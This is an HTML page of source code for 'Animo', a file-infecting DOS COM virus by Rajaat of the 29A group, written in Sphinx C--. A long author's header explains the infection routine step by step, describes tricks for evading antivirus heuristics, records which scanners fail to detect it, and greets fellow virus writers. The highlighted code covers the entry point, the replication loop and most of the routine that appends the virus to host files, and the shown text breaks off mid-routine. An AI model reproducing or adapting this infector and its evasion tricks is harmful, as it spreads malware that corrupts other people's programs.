<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.DOS.Animo.518 - 29A_2.5_F.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc2 {
	color: #008000;
}
.sc3 {
	color: #008080;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc7 {
	color: #808080;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
.sc19 {
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc3">/*****( Animo virus description )**********************************************
                                                     ‹€€€€€‹ ‹€€€€€‹ ‹€€€€€‹
Virus name    : Animo                                €€€ €€€ €€€ €€€ €€€ €€€
Author        : Rajaat / 29A                          ‹‹‹€€ﬂ ﬂ€€€€€€ €€€€€€€
Origin        : United Kingdom, January 29th         €€€‹‹‹‹ ‹‹‹‹€€€ €€€ €€€
Compiling     : Using Sphinx C-- (with XFILE pack)   €€€€€€€ €€€€€€ﬂ €€€ €€€
                C-- ANIMO
                This is a bit kind of special language, you can download it
                and the additional XFILE pack (which contains the lseek
                function) from the official Sphinx C-- site (it is written by
                Peter Cellik) which is located at
                http://www.geocities.com/SiliconValley/Vista/3559
Targets       : COM files (yuck!)
Infects on    : Runtime, files in the current directory (even more yuck!)
Size          : 518 bytes (impressive for the language, I love it!)
Resident      : No
Polymorphic   : No
Encrypted     : No
Stealth       : File date/time, but no critical error handler
Tunneling     : No
Retrovirus    : No
Antiheuristics: Yes, targetted against TBSCAN, which gives zero flags
Armor         : No
Payload       : No
Trigger       : None
Peculiarities : Written in Sphinx C-- is peculiar, I think, and a good start
                too. Works only on 80386+ (so?)
Drawbacks     : I don't know yet, this language happens to be so flexible that
                you certainly can do a lot more than just COM files, I'm now
                doing experiments with a multipartite virus already ;-)
Bugs          : Not that I am aware of...
Behaviour     : When an infected file is executed the virus will receive
                control with a near jump to its code located at the
                start of the file. Then it will get the entry point in
                SI by calling to the next line (a call is relative) and
                pop the return address (which is an absolute value) and
                substract the original located address of get_offset,
                effectively getting the difference of where the original
                compiled code is located and the now running code. For
                some reason unknown to me this doesn't alert TBSCAN,
                which could spot entrypoints calls with ease and flag
                like shit. Norman is really fucking up TBSCAN for
                good... A shame. Well, after it gets the entrypoint it
                will call to the start_replication() function. That
                subroutine will first rebuild the first 4 bytes of the
                infected COM file, so that it can be run again, after
                the virus is ready doing its work. Then it sets the DTA
                to the memory location where the virus in memory ends.
                The next line is some antiheuristic code for TBSCAN, it
                changes the "*.ZOM" search spec into "*.COM" (TBSCAN
                would flag on COM so this little change shuts down one
                flag). Then it will search for COM files with no
                attributes set in the current directory. If such file is
                found, it will temporarily store the search spec to
                "*.ZOM" again. Then it calls the function infect() with
                a pointer to the filename returned in the DTA as
                parameter. infect() will open the file in read/write
                mode and if the open succeeded it will read the first 4
                bytes of the file into a small buffer. If the 4th byte
                is an ! it will assume that the file is already infected
                and will skip it. Then it will check if the opened file
                has an EXE header. This is done in an antiheuristic
                fashion. If the file is indeed a COM file, it seek to
                the end of the file. If the filesize is larger than
                0x100 bytes (convert them yourself, weenie!) and smaller
                than 0xF000 (don't you have some calculator?), it will
                proceed with the infection. It then calculates the
                relative offset for the JMP instruction that will be
                placed at the start of the file. Then it will get the
                file date/time stamp and push it on the stack. After
                that it will load it's registers with the correct data
                and writes it's image at the end of the file. Then it
                jump back to the start of the file and will write the
                near jump to the virus code and the infection marker
                (!). When finished, it will restore the file date/time
                stamp and close the file. The routine to restore the
                date/time is also done antiheuristically and is so
                simple that I am amazed that TBSCAN fell for that
                old-hat trick. After infecting a file, it will search
                for the next file to infect, until all the files in the
                current directory are infected. The virus sets the DTA
                back to the normal address (0x80, which is 0x100 &gt;&gt; 2 or
                0x100 / 2, whatever you like most, it's half of it). It
                then pushes its return address (0x100, you already
                calculated this one) in some antiheuristic (blah) way on
                the stack, clears the AX register and returns control to
                the host, which runs like normal (unless it has some
                self check or when started with some oldsmobile).

                Sara Ford..... sounds like Science Fiction to me
                (those Capitals, are they Hidden Pictures or Some
                Message?)

Note          : I know that this is a simple COM infector and below
                standard, but this can be seen as a simple test to check
                out for myself if C-- is a convenient language and if it
                was possible to use for some more complex idea I
                initially had in mind with Borland C++, of which you
                also can get the source code on the first 2 versions (a
                direct action appending COM infector and a MCB resident
                appending COM infector). And yes, I think it is possible
                to bend C-- to my own twisted desires (oh, I have played
                Pandemonium 2 a bit too often lately, I fear). Well, the
                actual story how I came to write a virus in the peculiar
                language is like this: two days ago I found this program
                on some homepage (see above) by accident, while using a
                search engine to help me getting a C front-end for NASM,
                the Netwide ASseMbler, which is really a great
                Assembler, which I will try to use in the future
                L:-o-P-&lt; (Elvis Lives!). Yesterday I started my first
                experiments in C-- to learn a bit how the language
                works. Since I know both how to handle C and Assembler
                (and some others like Pascal, that are not worthwile
                mentioning here), and now my first virus written in this
                language lies in front of you! You can see from the
                source, that it is *VERY* flexible and if properly used,
                you can build really complex viruses with this, using
                the easy of C and the power of Assembler (btw, have you
                noticed that I write the word Assembler with a Capital
                A? Would this have a hidden meaning? Some Complex Code?
                A Secret Message? No, it's just my Language Worshipping
                Mood again &amp;-! By the way, the virus compiles very
                small, it's a very good compiler, and although writing
                in assembler still creates much tighter code, I think
                this language is worth a try. You can shorten code much
                by using register functions (try getting most of the
                return codes into the AX register, so you don't need the
                return code, which takes one extra "ret" code, even when
                returning with a fixed value).

                I hereby would like to show my gratitude to Peter Cellik
                for writing such a wonderful language, although I would
                like to see some things added, like:

                o       structures
                o       unions
                o       functions that generate no code at all (not even
                        the IRET)
                o       the possibility to do some AND operation in
                        if statements, like:

                        if ((filesize &gt; 0x100) &amp;&amp; (filesize &lt; 0xf000))

                        instead of this crummy way (although they
                        probably would generate the same thing, but I
                        think the above one is preferred and look more
                        clean to me):

                        if (filesize &gt; 0x100)
                          if (filesize &lt; 0xf000)

                o       doing some more complex calculations, which now
                        have to be broken up in parts, like:

                        cx = (cyl &lt;&lt; 8 | sector) | (cyl &amp; 0x300 &gt;&gt; 2);
                        CX = cx;

                        or even better:
                        CX = (cyl &lt;&lt; 8 | sector) | (cyl &amp; 0x300 &gt;&gt; 2);

                        instead of having to do manipulations like this,
                        which look not very readable to me:

                        cx = cyl &lt;&lt; 8 | sector;
                        cx |= cyl &amp; 0x300 &gt;&gt; 2;
                        CX = cx;

                        Or another example:

                        word virus_sectors()
                        {
                          AX = virus_bytes() / 512 + 1;
                        }

                        instead of:

                        word virus_sectors()
                        {
                          AX = virus_bytes() / 512;
                          AX++;
                        }

                Anyway, as a little token of my gratitude to Peter
                Cellik, I will post a litte part of his documentation in
                here:

                 "3.4  ABUSES

                  Anyone with a mischievous mind (most people do) can
                  think of some not so nice ways of using this function.
                  The most obvious of which would be the creation of
                  trojan horses.  I WOULD LIKE TO POINT OUT THAT THIS IS
                  NOT A CONSTRUCTIVE USE OF C-- AND ANY DESTRUCTIVE USE
                  OF COM FILE SYMBIOSIS IS PROHIBITED.  In other words,
                  don't be a jerk. "

                Well, I think I am no jerk, since I don't have to use
                that "feature" :-). Anybody who wants to write viruses
                in this language are also kindly asked to support Peter
                Celliks idea of GREENWARE. To cite:

                 "THE PRICE:
                  ~~~~~~~~~~
                  This version of C-- is GREENWARE, and you are free to
                  use it so long as you make an effort everyday to help
                  out the environment.  A few ideas:

                  - use only recycled computer paper
                  - be sure to recycle the computer paper after you use it
                  - use public transport
                  - sell that 80 cylinder car of yours and buy a small 4
                    cylinder, or better yet, buy a motorbike
                  - support Green Peace
                  - REDUCE-REUSE-recycle
                  - stop smoking
                  - ride a bike to work or school
                  - don't buy products that are harmful to the environment
                  - stop using weed killers on your lawn
                  - support Friends of the Earth
                  - recycle your cans
                  - don't buy products that have lots of extra packaging
                  - use a fax modem instead of a paper fax machine
                  - reuse your plastic bags
                  - (you get the idea) "

                Well, I think he has some great ideas there, in the
                progress of writing viruses, I waste tons of paper, I
                don't have a lawn, so I don't need weed killer anyway,
                all my trash gets recycled already, I have access to a
                HP Officejet LX, and I don't use plastic bags cut a more
                robust one. But one can go too far, Peter. I won't quit
                smoking, you never can convince me not going to Spain
                with Darkman by car (although I am scared by thinking of
                abandoning the "left hand path", and sure as hell I would
                not support a group of terrorists that plum a seal for a
                picture to shock people. I do not believe in the "can't
                make an omelette without breaking a few eggs" attitude.
                Fuck Green Peace! Though trying to stop French nuking
                is ok :-).

                Well, the comments are longer than the source, what else
                can I say, enjoy! By the way, those pieces of example
                codes of my wishlist above are code snippets for my next
                virus in C--.

                Rajaat / 29A
                rajaat@itookmyprozac.com
                http://www.geocities.com/SiliconValley/Vista/7227
                (I know, it's outdated, I hope to update it soon, a new
                page is in the making)

                Don't forget to take a look at these sites:

                    http://www.geocities.com/SiliconValley/Vista/3559
                    http://www.cryogen.com/Nasm
                    http://www.x86.org

*****( Results with antivirus software )***************************************

        TBSCAN                    - Doesn't detect it
        F-PROT                    - Doesn't detect it (yet)
        F-PROT /ANALYSE           - Detects it
        F-PROT /ANALYSE /PARANOID - Detects it (wow, genius)

*****( Greetings )*************************************************************

I hereby would like to take the opportunity to greet a few people:

        - the rest of the 29A people (it is great to work with you people)
        - the unforgiven and metal militia (heroes in the snow!)
        - z0mbie (ShadowRAM Technology rocks!)
        - [sm] (RT got quite some attention I heard!)
        - owl[fs] (still breeding some ideas?)
        - retch (MP3 CD? ;-)
        - bds (hiya!)
        - antigen and priest (when will I hear from you guys again?)
        - rhincewind (someday I'll be able to contact you again... I hope)
        - trigger (don't SLAM that door so hard, will ya?)
        - spicy impregnator (no taste)
        - qark &amp; quantum (get back to work)
        - metabolis (I miss your remarks)
        - raid (ASIC is fun, but not my idea of ideal virus language, you
                won't get much farther than a direct action generic prepending
                infector)

If anybody feels left out who deserves to get greeted by me can paste
their name between to two lines for *FREE* inclusion:

ÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕ

hahahahahahahahahahahahahaha die trying!

*****( Start of the virus code )**********************************************/</span><span class="sc0">

</span><span class="sc10">?</span><span class="sc0"> </span><span class="sc11">resize</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc0">                  </span><span class="sc2">// No memory resizing
</span><span class="sc10">?</span><span class="sc0"> </span><span class="sc11">jumptomain</span><span class="sc0"> </span><span class="sc11">NONE</span><span class="sc0">               </span><span class="sc2">// No jumps to main procedure
</span><span class="sc10">?</span><span class="sc0"> </span><span class="sc11">codesize</span><span class="sc0">                      </span><span class="sc2">// Optimize code for size
</span><span class="sc10">?</span><span class="sc0"> </span><span class="sc11">alignword</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc0">               </span><span class="sc2">// Align word on even offset set to off
</span><span class="sc0">
</span><span class="sc10">?</span><span class="sc0"> </span><span class="sc19">include</span><span class="sc0"> </span><span class="sc6">"dos.h--"</span><span class="sc0">             </span><span class="sc2">// Use DOS functions
</span><span class="sc10">?</span><span class="sc0"> </span><span class="sc19">include</span><span class="sc0"> </span><span class="sc6">"xfile.h--"</span><span class="sc0">           </span><span class="sc2">// And now new extended functions (LSEEK)
</span><span class="sc0">
</span><span class="sc11">byte</span><span class="sc0"> </span><span class="sc11">virus_end</span><span class="sc10">;</span><span class="sc0">                 </span><span class="sc2">// Last Data Item
</span><span class="sc0">
</span><span class="sc11">byte</span><span class="sc0"> </span><span class="sc11">nops</span><span class="sc10">[</span><span class="sc4">4</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc4">0x90</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x90</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x90</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x90</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0">     </span><span class="sc2">// Fake host
</span><span class="sc0">
</span><span class="sc11">word</span><span class="sc0"> </span><span class="sc11">main</span><span class="sc10">()</span><span class="sc0">                     </span><span class="sc2">// Virus entry point
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">$</span><span class="sc0"> </span><span class="sc11">CALL</span><span class="sc0"> </span><span class="sc11">get_delta</span><span class="sc0">              </span><span class="sc2">//
</span><span class="sc0">  </span><span class="sc11">get_delta</span><span class="sc10">:</span><span class="sc0">                    </span><span class="sc2">// Get delta offset in SI
</span><span class="sc0">  </span><span class="sc11">$</span><span class="sc0"> </span><span class="sc11">POP</span><span class="sc0"> </span><span class="sc11">SI</span><span class="sc0">                      </span><span class="sc2">//
</span><span class="sc0">  </span><span class="sc11">SI</span><span class="sc0"> </span><span class="sc10">-=</span><span class="sc0"> #</span><span class="sc11">get_delta</span><span class="sc10">;</span><span class="sc0">             </span><span class="sc2">//
</span><span class="sc0">  </span><span class="sc11">start_replication</span><span class="sc10">();</span><span class="sc0">          </span><span class="sc2">// Call replicator
</span><span class="sc0">  </span><span class="sc11">AX</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x100</span><span class="sc0"> </span><span class="sc10">^</span><span class="sc0"> </span><span class="sc4">0x6510</span><span class="sc10">;</span><span class="sc0">          </span><span class="sc2">// Push entrypoint
</span><span class="sc0">  </span><span class="sc11">AX</span><span class="sc0"> </span><span class="sc10">^=</span><span class="sc0"> </span><span class="sc4">0x6510</span><span class="sc10">;</span><span class="sc0">                 </span><span class="sc2">// with some antiheuristics
</span><span class="sc0">  </span><span class="sc11">$</span><span class="sc0"> </span><span class="sc11">PUSH</span><span class="sc0"> </span><span class="sc11">AX</span><span class="sc10">;</span><span class="sc0">                    </span><span class="sc2">// on the stack and
</span><span class="sc0">  </span><span class="sc11">AX</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">                       </span><span class="sc2">// clear AX
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">byte</span><span class="sc0"> </span><span class="sc11">host_bytes</span><span class="sc10">[</span><span class="sc4">4</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc4">0xCD</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x20</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0">  </span><span class="sc10">};</span><span class="sc0">     </span><span class="sc2">// Host data
</span><span class="sc11">byte</span><span class="sc0"> </span><span class="sc11">searchspec</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"*.ZOM"</span><span class="sc10">;</span><span class="sc0">      </span><span class="sc2">// Searchspec
</span><span class="sc11">byte</span><span class="sc0"> </span><span class="sc11">jumpop</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0xE9</span><span class="sc10">;</span><span class="sc0">             </span><span class="sc2">// Near jump
</span><span class="sc11">word</span><span class="sc0"> </span><span class="sc11">nearjmp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">               </span><span class="sc2">// The offset
</span><span class="sc11">byte</span><span class="sc0"> </span><span class="sc11">marker</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'!'</span><span class="sc10">;</span><span class="sc0">              </span><span class="sc2">// and infection marker
</span><span class="sc0">
</span><span class="sc11">byte</span><span class="sc0"> </span><span class="sc11">virus</span><span class="sc0">  </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"[Animo]"</span><span class="sc10">;</span><span class="sc0">        </span><span class="sc2">// Spliffbanger!
</span><span class="sc11">byte</span><span class="sc0"> </span><span class="sc11">author</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"[Rajaat/29A]"</span><span class="sc10">;</span><span class="sc0">   </span><span class="sc2">// some personal stuff
</span><span class="sc0">
</span><span class="sc11">start_replication</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">$</span><span class="sc0"> </span><span class="sc11">PUSH</span><span class="sc0"> </span><span class="sc11">SI</span><span class="sc0">                     </span><span class="sc2">// Preserve delta
</span><span class="sc0">  </span><span class="sc11">SI</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> #</span><span class="sc11">host_bytes</span><span class="sc10">[</span><span class="sc11">SI</span><span class="sc10">];</span><span class="sc0">         </span><span class="sc2">// Point to host bytes
</span><span class="sc0">  </span><span class="sc11">DI</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> #</span><span class="sc11">nops</span><span class="sc10">;</span><span class="sc0">                   </span><span class="sc2">// Absolute nops is at 0x100
</span><span class="sc0">  </span><span class="sc11">$</span><span class="sc0"> </span><span class="sc11">CLD</span><span class="sc0">                         </span><span class="sc2">// Clear direction
</span><span class="sc0">  </span><span class="sc11">$</span><span class="sc0"> </span><span class="sc11">MOVSW</span><span class="sc0">                       </span><span class="sc2">// Move the 4 bytes we have save to the
</span><span class="sc0">  </span><span class="sc11">$</span><span class="sc0"> </span><span class="sc11">MOVSW</span><span class="sc0">                       </span><span class="sc2">// start of the host
</span><span class="sc0">  </span><span class="sc11">$</span><span class="sc0"> </span><span class="sc11">POP</span><span class="sc0"> </span><span class="sc11">SI</span><span class="sc0">                      </span><span class="sc2">// Get delta back from stack
</span><span class="sc0">  </span><span class="sc11">setDTA</span><span class="sc10">(</span><span class="sc11">CS</span><span class="sc10">,</span><span class="sc0">#</span><span class="sc11">virus_end</span><span class="sc10">[</span><span class="sc11">SI</span><span class="sc10">]);</span><span class="sc0">    </span><span class="sc2">// Set DTA to behind virus image
</span><span class="sc0">  </span><span class="sc11">searchspec</span><span class="sc10">[</span><span class="sc11">SI</span><span class="sc10">+</span><span class="sc4">2</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'C'</span><span class="sc10">;</span><span class="sc0">       </span><span class="sc2">// Antiheuristics again
</span><span class="sc0">  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FINDFIRSTFILE</span><span class="sc10">(,,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0">#</span><span class="sc11">searchspec</span><span class="sc10">[</span><span class="sc11">SI</span><span class="sc10">])</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
  </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">do</span><span class="sc0">                          </span><span class="sc2">// We found a COM file
</span><span class="sc0">    </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc11">searchspec</span><span class="sc10">[</span><span class="sc11">SI</span><span class="sc10">+</span><span class="sc4">2</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'Z'</span><span class="sc10">;</span><span class="sc0">   </span><span class="sc2">// Again some antiheuristic action
</span><span class="sc0">      </span><span class="sc11">infect</span><span class="sc10">(</span><span class="sc0">#</span><span class="sc11">virus_end</span><span class="sc10">[</span><span class="sc11">SI</span><span class="sc10">+</span><span class="sc4">0x1e</span><span class="sc10">]);</span><span class="sc0"> </span><span class="sc2">// And call the infection routine
</span><span class="sc0">      </span><span class="sc11">searchspec</span><span class="sc10">[</span><span class="sc11">SI</span><span class="sc10">+</span><span class="sc4">2</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'C'</span><span class="sc10">;</span><span class="sc0">   </span><span class="sc2">// And back to normal for COM searching
</span><span class="sc0">      </span><span class="sc11">FINDNEXTFILE</span><span class="sc10">();</span><span class="sc0">           </span><span class="sc2">// And find next function
</span><span class="sc0">    </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">AX</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">          </span><span class="sc2">// Hopefully
</span><span class="sc0">  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc11">setDTA</span><span class="sc10">(</span><span class="sc11">CS</span><span class="sc10">,</span><span class="sc4">0x80</span><span class="sc10">);</span><span class="sc0">              </span><span class="sc2">// Restore DTA
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">infect</span><span class="sc10">(</span><span class="sc11">word</span><span class="sc0"> </span><span class="sc11">filename</span><span class="sc10">)</span><span class="sc0">           </span><span class="sc2">// Infection procedure
</span><span class="sc11">word</span><span class="sc0"> </span><span class="sc11">handle</span><span class="sc10">;</span><span class="sc0">                    </span><span class="sc2">// Temporary file handle placement
</span><span class="sc11">word</span><span class="sc0"> </span><span class="sc11">bytes_read</span><span class="sc10">;</span><span class="sc0">                </span><span class="sc2">// Amount of bytes read
</span><span class="sc11">word</span><span class="sc0"> </span><span class="sc11">myoffset</span><span class="sc10">;</span><span class="sc0">                  </span><span class="sc2">// My own offset (need multiple steps)
</span><span class="sc11">word</span><span class="sc0"> </span><span class="sc11">twobytes</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">filesize</span><span class="sc10">;</span><span class="sc0">                  </span><span class="sc2">// And the filesize
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">handle</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FOPEN</span><span class="sc10">(</span><span class="sc4">2</span><span class="sc10">,,,</span><span class="sc11">filename</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc2">// Open file with write access
</span><span class="sc0">  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">handle</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">              </span><span class="sc2">// If no error
</span><span class="sc0">  </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">FREAD</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">handle</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">,</span><span class="sc0"> #</span><span class="sc11">host_bytes</span><span class="sc10">[</span><span class="sc11">SI</span><span class="sc10">]);</span><span class="sc0">            </span><span class="sc2">// Read 4 bytes
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">host_bytes</span><span class="sc10">[</span><span class="sc11">SI</span><span class="sc10">+</span><span class="sc4">3</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc7">'!'</span><span class="sc10">)</span><span class="sc0">                     </span><span class="sc2">// Already infected
</span><span class="sc0">    </span><span class="sc10">{</span><span class="sc0">                                                </span><span class="sc2">// No, we continue
</span><span class="sc0">      </span><span class="sc11">twobytes</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">host_bytes</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">];</span><span class="sc0">                      </span><span class="sc2">// get 1st word
</span><span class="sc0">      </span><span class="sc11">twobytes</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">host_bytes</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">;</span><span class="sc0">                </span><span class="sc2">// stupid way
</span><span class="sc0">      </span><span class="sc11">twobytes</span><span class="sc0"> </span><span class="sc10">^=</span><span class="sc0"> </span><span class="sc4">0x029A</span><span class="sc10">;</span><span class="sc0">                            </span><span class="sc2">// Final antiheuristics
</span><span class="sc0">      </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">twobytes</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0x4d5a</span><span class="sc0"> </span><span class="sc10">^</span><span class="sc0"> </span><span class="sc4">0x029A</span><span class="sc10">)</span><span class="sc0">               </span><span class="sc2">// Check exe
</span><span class="sc0">      </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">twobytes</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0x5a4d</span><span class="sc0"> </span><span class="sc10">^</span><span class="sc0"> </span><span class="sc4">0x029A</span><span class="sc10">)</span><span class="sc0">               </span><span class="sc2">// weird exe
</span><span class="sc0">      </span><span class="sc11">twobytes</span><span class="sc0"> </span><span class="sc10">^=</span><span class="sc0"> </span><span class="sc4">0x029A</span><span class="sc10">;</span><span class="sc0">                            </span><span class="sc2">// Decrypt again ;-)
</span><span class="sc0">      </span><span class="sc11">filesize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">handle</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SEEK_END</span><span class="sc10">);</span><span class="sc0">    </span><span class="sc2">// Get filesize
</span><span class="sc0">      </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">filesize</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0x100</span><span class="sc10">)</span><span class="sc0">                          </span><span class="sc2">// Not too small?
</span><span class="sc0">        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">filesize</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0xf000</span><span class="sc10">)</span><span class="sc0">                       </span><span class="sc2">// Not too big?
</span><span class="sc0">        </span><span class="sc10">{</span><span class="sc0">                                            </span><span class="sc2">// Right size!
</span><span class="sc0">          </span><span class="sc11">nearjmp</span><span class="sc10">[</span><span class="sc11">SI</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">filesize</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">;</span><span class="sc0">                </span><span class="sc2">// Get relative EP
</span><span class="sc0">          </span><span class="sc11">AX</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x5700</span><span class="sc10">;</span><span class="sc0">                               </span><span class="sc2">// Store file date and
</span><span class="sc0">          </span><span class="sc11">$</span><span class="sc0"> </span><span class="sc11">INT</span><span class="sc0"> </span><span class="sc4">0x21</span><span class="sc10">;</span><span class="sc0">                                </span><span class="sc2">// time on the
</span><span class="sc0">          </span><span class="sc11">$</span><span class="sc0"> </span><span class="sc11">PUSH</span><span class="sc0"> </span><span class="sc11">CX</span><span class="sc10">;</span><span class="sc0">                                 </span><span class="sc2">// stack for later
</span><span class="sc0">          </span><span class="sc11">$</span><span class="sc0"> </span><span class="sc11">PUSH</span><span class="sc0"> </span><span class="sc11">DX</span><span class="sc10">;</span><span class="sc0">                                 </span><span class="sc2">// retrieval
</span><span class="sc0">          </span><span class="sc11">bytes_read</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">get_virus_size</span><span class="sc10">();</span><span class="sc0">             </span><span class="sc2">// virus size
</span><span class="sc0">          </span><span class="sc11">myoffset</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> #</span><span class="sc11">main</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">SI</span><span class="sc10">;</span><span class="sc0">                     </span><span class="sc2">// relative virus start
</span><span class="sc0">          </span><span class="sc11">FWRITE</span><span class="sc10">(,</span><span class="sc0"> </span><span class="sc11">handle</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">bytes_read</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">myoffset</span><span class="sc10">);</span><span class="sc0">    </span><span class="sc2">// write virus
</span><span class="sc0">          </span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">handle</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SEEK_SET</span><span class="sc10">);</span><span class="sc0">           </span><span class="sc2">// go start of file
</span><span class="sc0">          </span><span class="sc11">FWRITE</span><span class="sc10">(,</span><span class="sc0"> </span><span class="sc11">handle</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">,</span><span class="sc0"> #</span><span class="sc11">jumpop</span><span class="sc10">[</span><span class="sc11">SI</span><span class="sc10">]);</span><span class="sc0">          </span><span class="sc2">// write jump
</span><span class="sc0">          </span><span class="sc11">$</span><span class="sc0"> </span><span class="sc11">POP</span><span class="sc0"> </span><span class="sc11">DX</span><span class="sc10">;</span><span class="sc0">                                  </span><span class="sc2">// Restore date and
